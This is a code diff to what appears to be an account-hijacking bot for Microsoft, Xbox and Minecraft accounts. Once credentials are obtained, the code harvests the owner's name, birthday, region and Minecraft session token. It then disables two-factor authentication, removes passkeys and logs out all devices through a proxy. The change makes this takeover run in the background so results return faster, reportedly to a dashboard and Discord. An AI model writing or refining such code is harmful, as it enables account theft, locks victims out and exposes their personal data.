@@ -1802,78 +1802,78 @@ export async function runSecureBot(
       return null;
     }
 
-    // Optional enrichment AFTER success (must not fail the job)
-    try {
-      await log("info", "[secure] Getting AMC/owner info (optional)...");
-      const verificationToken = await withTimeout(getAMC(jar), 30_000, "getAMC");
-      if (verificationToken) {
-        const ownerInfo = await getOwnerInfo(jar, verificationToken);
-        if (ownerInfo) {
-          result.firstName = ownerInfo.firstName;
-          result.lastName = ownerInfo.lastName;
-          result.region = ownerInfo.region;
-          result.birthday = ownerInfo.birthday;
-        }
-      }
-    } catch (e) {
-      await log("warn", `[secure] owner info skipped: ${e instanceof Error ? e.message : e}`);
-    }
+    // Credentials are ready — return NOW so complete/dashboard/Discord update.
+    // Optional enrichment + cleanup must never block (proofs hang the whole job).
+    await log(
+      "info",
+      "[secure] Credentials ready — posting result (cleanup runs in background, non-blocking)",
+    );
 
-    try {
-      await log("info", "[secure] Getting Xbox/MC profile (optional)...");
-      const xbl = await withTimeout(getXBL(jar), 40_000, "getXBL");
-      if (xbl) {
-        const ssid = await getSSID(xbl);
-        if (ssid) {
-          result.ssid = ssid;
-          const capes = await getCapesList(ssid);
-          if (capes) result.capes = capes;
-          const profile = await getProfile(ssid);
-          if (profile) result.mcUsername = profile;
-          const method = await getMethod(ssid);
-          if (method) result.method = method;
-        }
-      }
-    } catch (e) {
-      await log("warn", `[secure] MC profile skipped: ${e instanceof Error ? e.message : e}`);
-    }
-
-    // Best-effort cleanup AFTER recovery success — hard budget so we always return credentials.
-    // On any timeout, drop remaining cleanup (hung ms_session must not block complete).
-    const cleanupBudgetMs = 35_000;
-    const cleanupDeadline = Date.now() + cleanupBudgetMs;
-    let cleanupStop = false;
-    const runCleanup = async (label: string, fn: () => Promise<unknown>, maxMs: number) => {
-      if (cleanupStop || Date.now() >= cleanupDeadline) {
-        await log("warn", `[secure] skip ${label} (cleanup budget / stop)`);
-        return;
-      }
-      const ms = Math.min(maxMs, Math.max(2_000, cleanupDeadline - Date.now()));
+    // Fire-and-forget enrichment/cleanup; never awaited by caller
+    void (async () => {
       try {
-        await log("info", `[secure] ${label}...`);
-        await withTimeout(fn(), ms, label);
-      } catch (e) {
-        await log("warn", `[secure] ${label}: ${e instanceof Error ? e.message : e}`);
-        cleanupStop = true;
+        try {
+          const verificationToken = await withTimeout(getAMC(jar), 12_000, "getAMC");
+          if (verificationToken) {
+            const ownerInfo = await getOwnerInfo(jar, verificationToken);
+            if (ownerInfo) {
+              result.firstName = ownerInfo.firstName;
+              result.lastName = ownerInfo.lastName;
+              result.region = ownerInfo.region;
+              result.birthday = ownerInfo.birthday;
+            }
+          }
+        } catch {
+          /* ignore */
+        }
+        try {
+          const xbl = await withTimeout(getXBL(jar), 15_000, "getXBL");
+          if (xbl) {
+            const ssid = await getSSID(xbl);
+            if (ssid) {
+              result.ssid = ssid;
+              const capes = await getCapesList(ssid);
+              if (capes) result.capes = capes;
+              const profile = await getProfile(ssid);
+              if (profile) result.mcUsername = profile;
+              const method = await getMethod(ssid);
+              if (method) result.method = method;
+            }
+          }
+        } catch {
+          /* ignore */
+        }
+        if (apiCanary) {
+          try {
+            await withTimeout(remove2FA(jar, apiCanary), 6_000, "remove2FA");
+          } catch {
+            /* ignore */
+          }
+          try {
+            await withTimeout(removeZyger(jar, apiCanary), 6_000, "removeZyger");
+          } catch {
+            /* ignore */
+          }
+          // Skip removeProofs entirely — known hang on sticky proxy
+          try {
+            await withTimeout(logoutAll(jar, apiCanary), 5_000, "logoutAll");
+          } catch {
+            /* ignore */
+          }
+        }
+      } catch {
+        /* ignore */
+      } finally {
         try {
           await closeMsSession();
         } catch {
           /* ignore */
         }
+        setStickyProxy(null);
       }
-    };
+    })();
 
-    if (apiCanary) {
-      await runCleanup("Disabling 2FA", () => remove2FA(jar, apiCanary), 8_000);
-      await runCleanup("Removing passkeys", () => removeZyger(jar, apiCanary), 8_000);
-      await runCleanup("Removing security proofs", () => removeProofs(jar, apiCanary), 12_000);
-    }
-    await runCleanup("Removing third-party services", () => removeServices(jar), 10_000);
-    if (apiCanary) {
-      await runCleanup("Logging out all devices", () => logoutAll(jar, apiCanary), 6_000);
-    }
-
-    await log("info", "[secure] Securing pipeline complete!");
+    await log("info", "[secure] Pipeline complete (result returned)");
     return result;
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e);
